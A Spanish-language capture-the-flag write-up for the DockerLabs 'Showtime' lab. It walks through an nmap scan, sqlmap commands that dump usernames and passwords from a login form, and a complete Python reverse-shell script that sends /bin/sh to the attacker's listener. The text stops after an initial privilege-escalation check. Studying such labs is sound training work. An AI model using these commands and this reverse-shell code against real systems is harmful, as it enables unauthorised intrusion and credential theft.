# Showtime

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Balulero`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

Tenemos 2 puertos abiertos, el 22 y el 80.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_1.jpg)    

Abrimos la web y en la home no encontramos nada interesante.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_2.jpg)     

Vemos que hay un enlace a Login y lo abrimos y vemos que nos encontramos un panel de autenticacíon.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_3.jpg)    

Utilizaremos la herramienta **sqlmap** para intentar extrapolar usernames y password.  
Ejecutaremos el comando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms --dbs --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_4.jpg)    

Ahora damos el comando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_5.jpg)      

Seguimos la enumeración digitando:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios --columns --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_6.jpg)     

Y por último:  

`sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios -C username,password -dump --batch`  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_7.jpg)      

Perfecto!  
Tenemos 3 usuarios con sus relativas contraseñas.  

Probamos a logearnos pero solamente con el usaurio joe podemos acceder a un panel que nos permite ejecutar comandos python.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_8.jpg)       

Ahora probamos a ver si funciona.  
Ejecutamos este comando:  

```
import os  
os.system ("ls")
```
![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_9.jpg)    

Perfecto, parece funcionar.  
Ahora lo que podemos intentar hacer es lanzarnos una reverse shell hacía nuestra maquina kali.
Nos pondremos a la escucha en en puerto 6969 de la nuestra kali y ejecutaremos el comando `nc -lvnp 6969`.   
Ahora ejecutaremo este cógido en el panel:  

```
import socket
import os
import subprocess

# Configura l'IP e la porta di destinazione
ip = "10.10.10.10"
port = 6969

# Crea il socket e connettiti al server
s = socket.socket()
s.connect((ip, port))

# Reindirizza stdin, stdout, stderr al socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Esegui la shell
subprocess.call("/bin/sh")
```
![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_10.jpg)    

Perfecto!  
Hemos obtenido una reverse shell.  
Ahora le aplicamos un tratamiento para poder trabajar más comodos.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_11.jpg)  

Probamos a dar los tipicos comandos para intentar escalar de privilegios, pero no vemos nada interesante.  

![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_12.jpg)   



